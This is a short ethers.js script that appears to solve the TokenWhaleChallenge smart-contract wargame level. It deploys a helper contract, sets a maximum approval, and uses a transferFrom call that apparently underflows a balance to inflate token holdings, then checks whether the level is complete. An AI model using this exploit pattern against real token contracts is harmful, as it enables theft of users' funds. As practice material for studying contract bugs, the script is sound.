// ethers js

const provider = new ethers.providers.JsonRpcProvider($rpcUrl)
const signer = provider.getSigner()
const address = await signer.getAddress()
const contract1 = $contracts["TokenWhaleChallenge"]
const contract2 = $contracts["Player"]
const factory1 = new ethers.ContractFactory(contract1.abi, contract1.evm.bytecode, provider.getSigner())
const factory2 = new ethers.ContractFactory(contract2.abi, contract2.evm.bytecode, provider.getSigner())

const player = await factory2.deploy()
const token = await factory1.deploy(player.address)

await player.setToken(token.address)
console.log(`Player: ${(await token.balanceOf(player.address)).toString()}`)
console.log(`Address: ${(await token.balanceOf(address)).toString()}`)
await token.approve(player.address, ethers.constants.MaxUint256, { gasLimit: 1000000 })
await player.approve({ gasLimit: 1000000 })
await token.transferFrom(player.address, player.address, 900, { gasLimit: 1000000 })
await token.transfer(player.address, 10000000, { gasLimit: 1000000 })
console.log(`Result: ${(await token.isComplete()).toString()}`)
console.log(`Player: ${(await token.balanceOf(player.address)).toString()}`)
console.log(`Address: ${(await token.balanceOf(address)).toString()}`)
